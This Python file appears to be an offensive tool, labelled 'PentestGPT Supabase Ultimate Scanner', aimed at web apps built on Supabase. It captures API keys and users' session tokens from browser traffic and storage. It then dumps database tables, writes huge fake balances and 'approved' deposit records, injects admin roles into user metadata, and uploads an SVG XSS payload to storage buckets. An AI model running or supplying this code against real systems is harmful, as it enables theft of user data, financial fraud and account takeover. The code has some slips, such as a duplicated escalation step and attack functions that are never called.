import asyncio
import json
import re
import aiohttp
import time
from playwright.async_api import async_playwright
import urllib.parse
import os

class SupabaseUltimateScanner:
    """
    PentestGPT Supabase Ultimate Scanner v2.0
    Adicionado: M√≥dulo de Extra√ß√£o Total via GraphQL Introspection.
    """
    
    def __init__(self, target_site_url, manual_supabase_url=None, manual_anon_key=None):
        self.target_site = target_site_url
        self.supabase_url = manual_supabase_url
        self.anon_key = manual_anon_key
        self.bearer_tokens = set()
        self.extracted_headers = {}
        self.network_requests = []
        self.discovered_tables = set()
        self.dump_dir = "scan"
        
        if not os.path.exists(self.dump_dir):
            os.makedirs(self.dump_dir)

    async def start_reconnaissance(self):
        # Se os dados foram providenciados manualmente (via GUI ou CLI override), pule o Scraper
        if self.supabase_url and self.anon_key:
            print(f"\\n[*] Modo Manual Ativado! Ignorando scraping interceptador.")
            self._analyze_stolen_artifacts()
            await self.exploit_phase()
            return
            
        print(f"\\n[*] Iniciando Modo STEALTH: Interceptando Painel de Rede (DevTools) em {self.target_site}")
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                viewport={'width': 1920, 'height': 1080}
            )
            page = await context.new_page()

            # Otimiza√ß√£o Oculta: Bloqueia recursos visuais pesados/in√∫teis para evitar erros de MIME no Console e espancar a performance
            async def block_visual_resources(route):
                if route.request.resource_type in ["image", "media", "font", "stylesheet"]:
                    await route.abort()
                else:
                    await route.continue_()
            await page.route("**/*", block_visual_resources)

            page.on("request", self._intercept_network_request)
            page.on("response", self._intercept_network_response)

            try:
                print("  [-] Navegando para o alvo e aguardando APIs...")
                await page.goto(self.target_site, wait_until="networkidle", timeout=30000)
                
                print("  [-] Validando Painel de Redes: Reiniciando a p√°gina para capturar o boot de APIs...")
                await page.reload(wait_until="networkidle", timeout=30000)
                
                await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                await asyncio.sleep(3)
                await self._extract_from_storage(page)
            except Exception as e:
                pass
            finally:
                await browser.close()

        self._analyze_stolen_artifacts()

        if self.supabase_url and self.anon_key:
            print(f"\\n[+] SUCESSO! Artefatos Supabase Extra√≠dos do Tr√°fego:")
            print(f"    URL: {self.supabase_url}")
            print(f"    ANON_KEY: {self.anon_key[:15]}...{self.anon_key[-10:]}")
            await self.exploit_phase()
        else:
             # Se falhar no scraping autom√°tico, pedimos manual para prosseguir o ataque.
             print("\\n[-] Falha ao extrair chaves automaticamente das requisi√ß√µes.")
             print("[-] Tente colar o URL e a ANON_KEY abaixo para for√ßar o Motor a ligar.")
             self.supabase_url = input("Forne√ßa a URL do Supabase MANUALMENTE (ex: https://xyz.supabase.co): ").strip()
             self.anon_key = input("Forne√ßa a ANON KEY MANUALMENTE (eyJ...): ").strip()
             if self.supabase_url and self.anon_key:
                 self._analyze_stolen_artifacts()
                 await self.exploit_phase()

    async def _intercept_network_request(self, request):
        url = request.url
        headers = request.headers
        if "supabase.co" in url:
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            if not self.supabase_url:
                self.supabase_url = base_url
            match = re.search(r'/rest/v1/([^?]+)', parsed.path)
            if match and match.group(1) != 'rpc':
                self.discovered_tables.add(match.group(1))

        if "apikey" in headers and len(headers["apikey"]) > 40:
            if not self.anon_key:
                self.anon_key = headers["apikey"]
        
        if "authorization" in headers:
            auth_val = headers["authorization"]
            if auth_val.startswith("Bearer "):
                token = auth_val.split("Bearer ")[1]
                if token != self.anon_key and len(token) > 40:
                    self.bearer_tokens.add(token)

    async def _intercept_network_response(self, response):
        url = response.url
        if "supabase.co" in url and response.status >= 400:
            try:
                body = await response.json()
                if "message" in body and "relation" in body["message"]:
                    match = re.search(r'relation "(.+?)"', body["message"])
                    if match:
                        tbl = match.group(1).replace('public.', '')
                        self.discovered_tables.add(tbl)
            except:
                pass

    async def _extract_from_storage(self, page):
        try:
            # 1. Tenta extrair do LocalStorage
            storage_dump = await page.evaluate("Object.assign({}, window.localStorage)")
            for key, val in storage_dump.items():
                if "supabase" in key.lower() and "auth-token" in key.lower():
                    data = json.loads(val)
                    if "access_token" in data:
                        self.bearer_tokens.add(data["access_token"])
                        
            # 2. Tenta extrair chaves hardcoded no HTML (Next.js, Nuxt, Vite)
            content = await page.content()
            
            # Regex para buscar URLs no formato Supabase
            url_match = re.search(r'(https://[a-zA-Z0-9-]+\.supabase\.co)', content)
            if url_match and not self.supabase_url:
                self.supabase_url = url_match.group(1)
                
            # Regex para buscar chaves JWT Anon (come√ßam com ey e cont√™m a palavra supabase)
            anon_matches = re.findall(r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.eyJpc3MiOiJzdXBhYmFzZSIs[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)', content)
            for m in anon_matches:
                 if len(m) > 100 and not self.anon_key:
                     self.anon_key = m
                     break
                     
        except Exception as e:
            pass

    def _analyze_stolen_artifacts(self):
        if self.anon_key:
            self.extracted_headers['apikey'] = self.anon_key
            self.extracted_headers['Content-Type'] = 'application/json'
            self.extracted_headers['X-Client-Info'] = 'supabase-js/2.33.1'
            self.extracted_headers['User-Agent'] = 'PentestGPT-Stealth-Scanner/2.0'

    async def exploit_phase(self):
        print(f"\\n[*] Iniciando Fase de Explora√ß√£o Ofensiva (PostgREST + GraphQL + Storage + Auth)")
        # Optimization: Connection pooling limits for better stability during concurrent mass fuzing
        connector = aiohttp.TCPConnector(ssl=False, limit=50, limit_per_host=20)
        
        timeout = aiohttp.ClientTimeout(total=45) # Optimization: Prevent hanging requests
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Ataque RLS Standart
            await self.attack_rls_bypass_tables(session)
            
            # 2. Descobrimento via OpenAPI (PostgREST root)
            openapi_schema = await self.attack_openapi_schema(session)
            if openapi_schema:
                await self.extract_data_concurrently(session, openapi_schema, "OpenAPI")
            
            # 5. Explora√ß√£o Financeira Direcionada (Deposits, Cards, Profiles)
            await self.targeted_financial_exploit(session)
            
            # 6. Escalonamento JWT
            if self.bearer_tokens:
                 await self.attack_jwt_privilege_escalation(session)
            else:
                 print("\\n[-] Pulo: Ataque JWT. Nenhum token de sess√£o v√≠vido foi roubado.")
                
            # 6. Escalonamento JWT
            if self.bearer_tokens:
                 await self.attack_jwt_privilege_escalation(session)
            else:
                 print("\\n[-] Pulo: Ataque JWT. Nenhum token de sess√£o v√≠vido foi roubado.")

    async def attack_openapi_schema(self, session):
        print("\\n[+] Testando Enumera√ß√£o de Schema via OpenAPI (PostgREST root)")
        url = f"{self.supabase_url}/rest/v1/?apikey={self.anon_key}"
        headers = self.extracted_headers.copy()
        
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                if "definitions" in data:
                    tables = list(data["definitions"].keys())
                    print(f"  [!] OpenAPI EXPOSTA! O PostgREST vazou o schema completo em /rest/v1/")
                    print(f"  [+] O Swagger descobriu {len(tables)} Tabelas/Views expostas.")
                    for t in tables:
                        self.discovered_tables.add(t)
                        print(f"      - {t}")
                    return tables
            print(f"  [OK] OpenAPI Root (/rest/v1/) protegido ou inacess√≠vel. ({resp.status})")
            return None

    async def attack_storage_buckets(self, session):
        print("\\n[+] Testando Enumera√ß√£o e Enumera√ß√£o de Storage (Buckets P√∫blicos/Privados)")
        url = f"{self.supabase_url}/storage/v1/bucket"
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {self.anon_key}"
        
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                buckets = await resp.json()
                if isinstance(buckets, list) and len(buckets) > 0:
                    print(f"  [!] STORAGE VAZADO! Descobrido {len(buckets)} buckets de arquivos.")
                    for b in buckets:
                        b_name = b.get('name', 'Unknown')
                        b_public = b.get('public', False)
                        print(f"      - Bucket: '{b_name}' | P√∫blico: {b_public}")
                        
                        # Testa injetar um arquivo XSS payload no bucket
                        await self.test_bucket_upload(session, b_name)
                else:
                    print("  [OK] Nenhum bucket encontrado ou listagem bloqueada.")
            else:
                 print(f"  [OK] Storage /bucket endpoint bloqueado. ({resp.status})")

    async def test_bucket_upload(self, session, bucket_name):
        url = f"{self.supabase_url}/storage/v1/object/{bucket_name}/pentestgpt_poc.svg"
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {self.anon_key}"
        headers['Content-Type'] = 'image/svg+xml'
        
        # Payload malicioso: um arquivo SVG que executa c√≥digo JavaScript em navegadores que o abrirem
        xss_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'PentestGPT XSS Executed!\')"></svg>'
        
        async with session.post(url, data=xss_payload, headers=headers) as resp:
             if resp.status in (200, 201):
                  print(f"      [!] CR√çTICO! ARBITRARY FILE UPLOAD PERMITIDO no bucket '{bucket_name}'!")
                  print(f"           Payload malicioso em: {self.supabase_url}/storage/v1/object/public/{bucket_name}/pentestgpt_poc.svg")
             else:
                  print(f"      [OK] Bucket '{bucket_name}' bloqueou o upload (RLS/Auth requeridas).")

    async def extract_data_concurrently(self, session, tables, source_name):
        print(f"\\n[+] Iniciando Mass-Dump Concorrente nas Tabelas ({source_name})...")
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {self.anon_key}"
        
        async def fetch_table(table):
            if "Filter" in table or "Patch" in table or "Record" in table: return
            
            # PostgREST Fuzzing: tentando bypass complexo usando rela√ß√µes vazias e select
            urls = [
                f"{self.supabase_url}/rest/v1/{table}?select=*",
                f"{self.supabase_url}/rest/v1/{table}?id=not.is.null", # Bypass simples
                f"{self.supabase_url}/rest/v1/{table}?select=*,*(*)", # Bypass agressivo com subqueries
                f"{self.supabase_url}/rest/v1/{table}?limit=10000",   # Quebra de pagina√ß√£o local
                f"{self.supabase_url}/rest/v1/{table}", # Chamada limpa
                f"{self.supabase_url}/rest/v1/{table}?limit=1", # Bypass restrito
                f"{self.supabase_url}/rest/v1/{table}?select=id", # Bypass minimo
                f"{self.supabase_url}/rest/v1/{table}?order=id.desc.nullslast" # Bypass via Order
            ]
            
            # Tentar GET
            for url in urls:
                try:
                    async with session.get(url, headers=headers) as vuln_test:
                        if vuln_test.status == 200:
                            data = await vuln_test.json()
                            if isinstance(data, list):
                                if len(data) > 0:
                                    print(f"      [!] DUMP SUCESSO! A tabela oculta '{table}' vazou {len(data)} linhas via {source_name}.")
                                    self._save_dump(f"{source_name}_LEAK_{table}", data)
                                    return # J√° extraiu
                except Exception as e:
                    pass # Ignore timeouts or connection drops to keep the pipeline moving
                            
            print(f"      [OK] Tabela '{table}' tem RLS forte (Zerar rows).")
            return
        
        # Atira de forma paralela via asyncio.gather para derrubar as defesas rapido
        # Optimization: Use return_exceptions=True so one failed task doesn't crash the loop
        tasks = [fetch_table(t) for t in tables]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def attack_rls_bypass_tables(self, session):
        print("\\n[+] Testando Bypass de Row Level Security (RLS) via REST API")
        targets = list(self.discovered_tables) + ["profiles", "users", "admin", "settings", "app_settings"]
        unique_targets = list(set(targets))
        
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {self.anon_key}"
        
        for table in unique_targets:
            url = f"{self.supabase_url}/rest/v1/{table}?select=*"
            async with session.get(url, headers=headers) as vuln_test:
                if vuln_test.status == 200:
                    data = await vuln_test.json()
                    if isinstance(data, list) and len(data) > 0:
                        print(f"  [+] RLS Bypass (REST) na tabela '{table}'. Registros: {len(data)}")
                        self._save_dump(table, data)

    async def attack_graphql_introspection(self, session):
        print("\\n[+] Testando Enumera√ß√£o Massiva da Estrutura do Banco via GraphQL Introspection")
        url = f"{self.supabase_url}/graphql/v1"
        
        # A query de Introspection que extrai todos os Nomes das Tabelas (Objects) e suas Colunas (Fields)
        introspection_query = {
            "query": """
            query IntrospectionQuery {
              __schema {
                types {
                  name
                  kind
                  fields {
                    name
                  }
                }
              }
            }
            """
        }
        
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {self.anon_key}"
        
        async with session.post(url, json=introspection_query, headers=headers) as gql_resp:
            if gql_resp.status == 200:
                data = await gql_resp.json()
                if "data" in data and "__schema" in data["data"]:
                    print(f"  [!] CRITICO! O modulo pg_graphql retornou o mapa completo do banco de dados!")
                    types = data["data"]["__schema"]["types"]
                    
                    # Filtramos tabelas de servi√ßo do GraphQL que n√£o nos interessam
                    ignored_prefixes = ("__", "String", "Boolean", "Int", "Float", "ID", "UUID", "JSON", "Datetime", "PageInfo", "Cursor")
                    
                    discovered_collections = {}
                    
                    for t in types:
                        name = t.get("name", "")
                        kind = t.get("kind", "")
                        fields = t.get("fields")
                        
                        # Procuramos por Objects (Tabelas) que n√£o sejam metadados
                        if kind == "OBJECT" and not name.startswith(ignored_prefixes) and not name.endswith("Connection") and not name.endswith("Edge") and name != "Query" and name != "Mutation":
                             if fields:
                                 col_names = [f["name"] for f in fields]
                                 # Apenas tabelas que t√™m o node 'edges/node' costumam ser as cole√ß√µes do Supabase pg_graphql
                                 if "nodeId" in col_names or name.islower():
                                    discovered_collections[name] = col_names
                    
                    # Tentar DUMP GraphQL Imediato
                    if discovered_collections:
                        print("\\n  [-] Tentando Extracao de Dados via GraphQL (Edge Node Traversal)...")
                        headers_gql = headers.copy()
                        for tbl, cols in discovered_collections.items():
                            fields_str = " ".join([c for c in cols if " " not in c and "Collection" not in c][:10]) # Pega as 10 primeiras colunas
                            collection_name = f"{tbl}Collection"
                            dump_query = {"query": f"query {{ {collection_name} (first: 1000) {{ edges {{ node {{ {fields_str} }} }} }} }}"}
                            try:
                                async with session.post(url, json=dump_query, headers=headers_gql) as exec_resp:
                                    if exec_resp.status == 200:
                                        exec_data = await exec_resp.json()
                                        edges = exec_data.get("data", {}).get(collection_name, {}).get("edges", [])
                                        if edges:
                                            print(f"      [üö®] DUMP GQL SUCESSO! Tabela '{tbl}' (GraphQL) vazou {len(edges)} linhas!")
                                            nodes = [edge.get("node", {}) for edge in edges]
                                            self._save_dump(f"GraphQL_LEAK_{tbl}", nodes)
                            except Exception as e:
                                pass # Continuation on graphical traversal errors
                                        
                    return discovered_collections
                else:
                    print(f"  [OK] GraphQL Introspection protegido ou bloqueado.")
                    return None
            else:
                 print(f"  [OK] Endpoint GraphQL inativo ou inacessivel. ({gql_resp.status})")
                 return None

    async def targeted_financial_exploit(self, session):
        print("\\n[+] Iniciando Ataque Financeiro Direcionado (Profiles, Deposits, Cards)")
        if not self.anon_key: return
        
        headers = self.extracted_headers.copy()
        # Iterando sobre TODAS as chaves roubadas para maximizar as chances
        tokens_to_try = list(self.bearer_tokens) if self.bearer_tokens else [self.anon_key]
        
        for idx, token in enumerate(tokens_to_try):
            headers['Authorization'] = f"Bearer {token}"
            user_id = self._get_user_id_from_token(token) if token != self.anon_key else "unknown_user_id"
            print(f"  [*] Executando Ataque Direcionado usando Token [{idx+1}/{len(tokens_to_try)}] (User ID: {user_id})")
            
            # 1. Injetar Saldo em Profiles (PATCH gen√©rico se user_id falhar)
            print("  [-] Tentando injetar 99.999.999 de saldo direto nas tabelas 'profiles', 'users', 'admin'...")
            for tbl in ["profiles", "users", "admin"]:
                profile_url = f"{self.supabase_url}/rest/v1/{tbl}?user_id=eq.{user_id}"
                profile_url_alt = f"{self.supabase_url}/rest/v1/{tbl}?id=eq.{user_id}"
                
                payload_profile = {"balance": 99999999999999, "credits": 99999999999999}
                for u in [profile_url, profile_url_alt]:
                    async with session.patch(u, json=payload_profile, headers=headers) as resp:
                        if resp.status in (200, 204):
                            print(f"      [üö®] CR√çTICO! Tabela '{tbl}' alterada via PATCH! Saldo infinito adicionado. ({u})")
                            break # Deu certo
                    
            # 2. For√ßar Dep√≥sito Aprovado Falso
            print("  [-] Tentando criar um registro falso de dep√≥sito na tabela 'deposits' e 'deposits_safe' via POST...")
            for tbl in ["deposits", "deposits_safe", "purchase_logs"]:
                deposit_url = f"{self.supabase_url}/rest/v1/{tbl}"
                # Mistura varios possiveis campos financeiros
                payload_deposit = {
                    "amount": 99999999999999,
                    "status": "approved",
                    "user_id": user_id,
                    "value": 99999999999999,
                    "state": "success"
                }
                headers_post = headers.copy()
                headers_post["Prefer"] = "return=representation"
                async with session.post(deposit_url, json=payload_deposit, headers=headers_post) as resp:
                    if resp.status in (200, 201):
                        data = await resp.json()
                        print(f"      [üö®] CR√çTICO! Dep√≥sito fantasma feito na tabela '{tbl}'! Resposta: {json.dumps(data)[:100]}...")
                        break

    def _get_user_id_from_token(self, token):
        # Tenta extrair o ID do usu√°rio decodificando o JWT (base64)
        if not token or len(token) < 40: return "unknown_user_id"
        try:
            import base64
            payload_b64 = token.split(".")[1]
            padded = payload_b64 + "=" * ((4 - len(payload_b64) % 4) % 4)
            payload = json.loads(base64.b64decode(padded).decode("utf-8"))
            return payload.get("sub", "unknown_user_id")
        except:
            return "unknown_user_id"

    # extract_data_from_graphql_schema foi substitu√≠do pelo extract_data_concurrently

    async def attack_jwt_privilege_escalation(self, session):
        """
        No Supabase, o usu√°rio logado tem controle parcial sobre seu pr√≥prio `user_metadata`
        se a API de Auth estiver mal configurada ou desatualizada. 
        Este ataque for√ßa o escalonamento de privil√©gio (Role Admin) e Adi√ß√£o de Saldo.
        """
        print("\\n[+] Testando Escalonamento de Privil√©gios (JWT user_metadata Manipulation)")
        
        token = list(self.bearer_tokens)[0] # Pega a primeira v√≠tima logada interceptada
        headers = self.extracted_headers.copy()
        headers['Authorization'] = f"Bearer {token}"
        
        url = f"{self.supabase_url}/auth/v1/user"
        
        # O Ataque: Tentar injetar roles de Admin e Saldo Ilimitado no Metadata do Usu√°rio.
        # Muitas l√≥gicas de frontend/backend falhas confiam no user_metadata para autoriza√ß√£o.
        malicious_payload = {
            "data": {
                "role": "admin",
                "is_admin": True,
                "is_super_admin": True,
                "plan": "premium",
                "balance": 99999999999999,
                "credits": 99999999999999
            }
        }
        
        async with session.put(url, json=malicious_payload, headers=headers) as esc_resp:
            if esc_resp.status == 200:
                body = await esc_resp.json()
                print(f"  [!] ALTO! Escalonamento Bem-sucedido! A API permitiu manipular o auth_metadata livremente.")
                print(f"       Metadata Atual P√≥s-Ataque: {json.dumps(body.get('user_metadata', {}))}")
                print(f"       O atacante agora inseriu a role 'admin' e o saldo massivo no JSON de Autentica√ß√£o.")
                print(f"       Se o frontend ou o RLS confiam no JWT para checar saldo/roles, o sistema est√° comprometido.")
            else:
                print(f"  [OK] Seguro: O Supabase bloqueou a inje√ß√£o via endpoint de usu√°rio. ({esc_resp.status})")

    def _save_dump(self, table_name, data):
        # Garante que o diret√≥rio exista de forma s√≠ncrona / absoluta
        dump_path = os.path.abspath(self.dump_dir)
        if not os.path.exists(dump_path):
            os.makedirs(dump_path, exist_ok=True)
            
        # Sanitiza hifens ou barras do nome da tabela pro arquivo
        safe_name = table_name.replace("/", "_").replace("\\", "_")
        filename = os.path.join(dump_path, f"{safe_name}_dump.json")
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
            print(f"      [!] DADOS SALVOS EM: {filename}")
        except Exception as e:
            print(f"      [ERRO] Falha ao salvar arquivo {filename}: {e}")

if __name__ == "__main__":
    import sys
    # Se houver argumento usa ele, sen√£o pede
    target = sys.argv[1] if len(sys.argv) > 1 else input("Insira a URL do ALVO (Site/Frontend) para o Scraper DevTools: ")
    if target:
        scanner = SupabaseUltimateScanner(target)
        asyncio.run(scanner.start_reconnaissance())
